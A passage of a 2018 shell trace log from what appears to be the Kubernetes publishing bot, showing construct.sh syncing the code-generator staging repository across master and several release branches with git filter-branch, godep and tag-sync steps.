diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\t++ basename /go-workspace/src/k8s.io/code-generator\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/code-generator/\") or . == \"k8s.io/code-generator\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit ''\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ grep '^Kubernetes-commit: '\n>\t++ git log --format=%B HEAD\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=0f17e9ade6e089eadb7c09052a4a030f155a0eb0\n>\t+ '[' -z 0f17e9ade6e089eadb7c09052a4a030f155a0eb0 ']'\n>\t++ git-find-merge 0f17e9ade6e089eadb7c09052a4a030f155a0eb0 upstream-branch\n>\t++ tail -1\n>\t+++ git rev-list '0f17e9ade6e089eadb7c09052a4a030f155a0eb0^1..upstream-branch' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 0f17e9ade6e089eadb7c09052a4a030f155a0eb0..upstream-branch --ancestry-path\n>\t+++ git rev-parse 0f17e9ade6e089eadb7c09052a4a030f155a0eb0\n>\t+ local k_last_kube_merge=0f17e9ade6e089eadb7c09052a4a030f155a0eb0\n>\t+ local dep_count=0\n>\t+ (( i=0 ))\n>\t+ (( i<0 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' false = true ']'\n>\t+ git add Godeps/Godeps.json\n>\t+ git clean -f Godeps\n>\t+ git add vendor/ --ignore-errors\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\tGodeps.json hasn't changed!\n>\t+ git diff HEAD --exit-code\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' master '!=' master ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code 56d0727d10061ee232732d8fc5bc89d72fe64948\n>\tRemove redundant godep commits on-top of 56d0727d10061ee232732d8fc5bc89d72fe64948.\n>\t+ echo 'Remove redundant godep commits on-top of 56d0727d10061ee232732d8fc5bc89d72fe64948.'\n>\t+ git reset --soft -q 56d0727d10061ee232732d8fc5bc89d72fe64948\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/code-generator\n>\t+ local repo=code-generator\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\t+ '[' -n '56d0727 Merge pull request #69386 from cblecker/go-1.11' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-code-generator-master'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-code-generator-master\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=master\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=56d0727d10061ee232732d8fc5bc89d72fe64948\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-code-generator-master.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-code-generator-master.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch master --push-script ../push-tags-code-generator-master.sh --dependencies '' --mapping-output-file '../tag-code-generator-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\t++ git rev-parse master\n>\t+ '[' 56d0727d10061ee232732d8fc5bc89d72fe64948 '!=' 56d0727d10061ee232732d8fc5bc89d72fe64948 ']'\n>\t+ git checkout master\n>\tAlready on 'master'\n>\tYour branch is up-to-date with 'origin/master'.\n>[06 Oct 18 08:31 UTC]: Successfully constructed master\n>[06 Oct 18 08:31 UTC]: /publish_scripts/construct.sh code-generator release-1.9 release-1.9   /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/code-generator kubernetes kubernetes k8s.io false \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  b5ec061c7ab9995a801206ea74f614ced04206d2\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=code-generator\n>\t+ SRC_BRANCH=release-1.9\n>\t+ DST_BRANCH=release-1.9\n>\t+ DEPS=\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/code-generator\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=false\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=b5ec061c7ab9995a801206ea74f614ced04206d2\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 56d0727d10061ee232732d8fc5bc89d72fe64948\n>\t+ git branch -D release-1.9\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.9\n>\tSwitching to origin/release-1.9.\n>\t+ echo 'Switching to origin/release-1.9.'\n>\t+ git branch -f release-1.9 origin/release-1.9\n>\t+ git checkout -q release-1.9\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.9\n>\tSkipping sync because upstream/release-1.9 at b5ec061c7ab9995a801206ea74f614ced04206d2 did not change since last sync.\n>\t+ UPSTREAM_HASH=b5ec061c7ab9995a801206ea74f614ced04206d2\n>\t+ '[' b5ec061c7ab9995a801206ea74f614ced04206d2 '!=' b5ec061c7ab9995a801206ea74f614ced04206d2 ']'\n>\t+ echo 'Skipping sync because upstream/release-1.9 at b5ec061c7ab9995a801206ea74f614ced04206d2 did not change since last sync.'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.9\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=0ab89e584187c20cc7c1a3f30db69f3b4ab64196\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-code-generator-release-1.9.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-code-generator-release-1.9.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.9 --push-script ../push-tags-code-generator-release-1.9.sh --dependencies '' --mapping-output-file '../tag-code-generator-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\t++ git rev-parse release-1.9\n>\t+ '[' 0ab89e584187c20cc7c1a3f30db69f3b4ab64196 '!=' 0ab89e584187c20cc7c1a3f30db69f3b4ab64196 ']'\n>\t+ git checkout release-1.9\n>\tAlready on 'release-1.9'\n>\tYour branch is up-to-date with 'origin/release-1.9'.\n>[06 Oct 18 08:31 UTC]: Successfully constructed release-1.9\n>[06 Oct 18 08:31 UTC]: /publish_scripts/construct.sh code-generator release-1.10 release-1.10   /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/code-generator kubernetes kubernetes k8s.io false \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  e749dfaeac568d039634248b9017eaf66c37e4ca\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=code-generator\n>\t+ SRC_BRANCH=release-1.10\n>\t+ DST_BRANCH=release-1.10\n>\t+ DEPS=\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/code-generator\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=false\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=e749dfaeac568d039634248b9017eaf66c37e4ca\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 0ab89e584187c20cc7c1a3f30db69f3b4ab64196\n>\t+ git branch -D release-1.10\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.10\n>\tSwitching to origin/release-1.10.\n>\t+ echo 'Switching to origin/release-1.10.'\n>\t+ git branch -f release-1.10 origin/release-1.10\n>\t+ git checkout -q release-1.10\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ grep -w -q upstream\n>\t+ git remote\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.10\n>\t+ UPSTREAM_HASH=e749dfaeac568d039634248b9017eaf66c37e4ca\n>\t+ '[' e749dfaeac568d039634248b9017eaf66c37e4ca '!=' e749dfaeac568d039634248b9017eaf66c37e4ca ']'\n>\t+ echo 'Skipping sync because upstream/release-1.10 at e749dfaeac568d039634248b9017eaf66c37e4ca did not change since last sync.'\n>\tSkipping sync because upstream/release-1.10 at e749dfaeac568d039634248b9017eaf66c37e4ca did not change since last sync.\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.10\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=9de8e796a74d16d2a285165727d04c185ebca6dc\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-code-generator-release-1.10.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-code-generator-release-1.10.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.10 --push-script ../push-tags-code-generator-release-1.10.sh --dependencies '' --mapping-output-file '../tag-code-generator-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\t++ git rev-parse release-1.10\n>\t+ '[' 9de8e796a74d16d2a285165727d04c185ebca6dc '!=' 9de8e796a74d16d2a285165727d04c185ebca6dc ']'\n>\t+ git checkout release-1.10\n>\tAlready on 'release-1.10'\n>\tYour branch is up-to-date with 'origin/release-1.10'.\n>[06 Oct 18 08:31 UTC]: Successfully constructed release-1.10\n>[06 Oct 18 08:31 UTC]: /publish_scripts/construct.sh code-generator release-1.11 release-1.11   /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/code-generator kubernetes kubernetes k8s.io false \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  cd6e3aed88a18b65cebe65e2e577455b0352ccf5\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=code-generator\n>\t+ SRC_BRANCH=release-1.11\n>\t+ DST_BRANCH=release-1.11\n>\t+ DEPS=\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/code-generator\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=false\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=cd6e3aed88a18b65cebe65e2e577455b0352ccf5\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 9de8e796a74d16d2a285165727d04c185ebca6dc\n>\t+ git branch -D release-1.11\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.11\n>\tSwitching to origin/release-1.11.\n>\t+ echo 'Switching to origin/release-1.11.'\n>\t+ git branch -f release-1.11 origin/release-1.11\n>\t+ git checkout -q release-1.11\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.11\n>\t+ UPSTREAM_HASH=cd6e3aed88a18b65cebe65e2e577455b0352ccf5\n>\t+ '[' cd6e3aed88a18b65cebe65e2e577455b0352ccf5 '!=' cd6e3aed88a18b65cebe65e2e577455b0352ccf5 ']'\n>\t+ echo 'Skipping sync because upstream/release-1.11 at cd6e3aed88a18b65cebe65e2e577455b0352ccf5 did not change since last sync.'\n>\tSkipping sync because upstream/release-1.11 at cd6e3aed88a18b65cebe65e2e577455b0352ccf5 did not change since last sync.\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.11\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=8c97d6ab64da020f8b151e9d3ed8af3172f5c390\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-code-generator-release-1.11.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-code-generator-release-1.11.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.11 --push-script ../push-tags-code-generator-release-1.11.sh --dependencies '' --mapping-output-file '../tag-code-generator-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\t++ git rev-parse release-1.11\n>\t+ '[' 8c97d6ab64da020f8b151e9d3ed8af3172f5c390 '!=' 8c97d6ab64da020f8b151e9d3ed8af3172f5c390 ']'\n>\t+ git checkout release-1.11\n>\tAlready on 'release-1.11'\n>\tYour branch is up-to-date with 'origin/release-1.11'.\n>[06 Oct 18 08:32 UTC]: Successfully constructed release-1.11\n>[06 Oct 18 08:32 UTC]: /publish_scripts/construct.sh code-generator release-1.12 release-1.12   /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/code-generator kubernetes kubernetes k8s.io false \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  b3b4e1d6a9f6d60b02046549615b886ea95b97cf\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=code-generator\n>\t+ SRC_BRANCH=release-1.12\n>\t+ DST_BRANCH=release-1.12\n>\t+ DEPS=\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/code-generator\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=false\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=b3b4e1d6a9f6d60b02046549615b886ea95b97cf\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 8c97d6ab64da020f8b151e9d3ed8af3172f5c390\n>\t+ git branch -D release-1.12\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.12\n>\t+ echo 'Switching to origin/release-1.12.'\n>\t+ git branch -f release-1.12 origin/release-1.12\n>\tSwitching to origin/release-1.12.\n>\t+ git checkout -q release-1.12\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.12\n>\tUpstream branch upstream/release-1.12 moved from 'b3b4e1d6a9f6d60b02046549615b886ea95b97cf' to 'cb3b437525d6a859969e64074e27b3af26800e71'. We have to sync.\n>\t+ UPSTREAM_HASH=cb3b437525d6a859969e64074e27b3af26800e71\n>\t+ '[' cb3b437525d6a859969e64074e27b3af26800e71 '!=' b3b4e1d6a9f6d60b02046549615b886ea95b97cf ']'\n>\t+ echo 'Upstream branch upstream/release-1.12 moved from '\\''b3b4e1d6a9f6d60b02046549615b886ea95b97cf'\\'' to '\\''cb3b437525d6a859969e64074e27b3af26800e71'\\''. We have to sync.'\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/code-generator release-1.12 release-1.12 '' '' k8s.io false 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/code-generator\n>\t+ local src_branch=release-1.12\n>\t+ local dst_branch=release-1.12\n>\t+ local deps=\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ shift 9\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\t3dcf91f64f638563e5106f21f50c31fa361c918d\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 15 = 0 ']'\n>\t++ git rev-parse HEAD\n>\tStarting at existing release-1.12 commit 3dcf91f64f638563e5106f21f50c31fa361c918d.\n>\t+ echo 'Starting at existing release-1.12 commit 3dcf91f64f638563e5106f21f50c31fa361c918d.'\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/release-1.12\n>\tBranch upstream-branch set up to track remote branch release-1.12 from upstream.\n>\t++ git rev-parse upstream-branch\n>\tChecked out source commit cb3b437525d6a859969e64074e27b3af26800e71.\n>\t+ echo 'Checked out source commit cb3b437525d6a859969e64074e27b3af26800e71.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit release-1.12\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B release-1.12\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t++ true\n>\t+ local k_base_commit=5f6008cadc6e03bf1c84cae2ef4c239d2a111006\n>\t+ '[' -z 5f6008cadc6e03bf1c84cae2ef4c239d2a111006 ']'\n>\t++ git-find-merge 5f6008cadc6e03bf1c84cae2ef4c239d2a111006 upstream/release-1.12\n>\t++ tail -1\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 5f6008cadc6e03bf1c84cae2ef4c239d2a111006..upstream/release-1.12 --ancestry-path\n>\t+++ git rev-list '5f6008cadc6e03bf1c84cae2ef4c239d2a111006^1..upstream/release-1.12' --first-parent\n>\t+++ git rev-parse 5f6008cadc6e03bf1c84cae2ef4c239d2a111006\n>\t+ local k_base_merge=5f6008cadc6e03bf1c84cae2ef4c239d2a111006\n>\t+ '[' -z 5f6008cadc6e03bf1c84cae2ef4c239d2a111006 ']'\n>\t+ git branch -f filtered-branch-base 5f6008cadc6e03bf1c84cae2ef4c239d2a111006\n>\tRewriting upstream branch release-1.12 to only include commits for staging/src/k8s.io/code-generator.\n>\t+ echo 'Rewriting upstream branch release-1.12 to only include commits for staging/src/k8s.io/code-generator.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/code-generator 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/code-generator\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\tRunning git filter-branch ...\n>\t+ local index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ patterns=()\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/code-generator -- filtered-branch filtered-branch-base\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=0aecd14c539d69150c5c4b198ea78c7993e17a37\n>\t++ git log --first-parent --format=%H --reverse 0aecd14c539d69150c5c4b198ea78c7993e17a37..HEAD\n>\tChecking out branch release-1.12.\n>\t+ f_mainline_commits=\n>\t+ echo 'Checking out branch release-1.12.'\n>\t+ git checkout -q release-1.12\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=3dcf91f64f638563e5106f21f50c31fa361c918d\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ local dst_merge_point_commit=3dcf91f64f638563e5106f21f50c31fa361c918d\n>\t+ 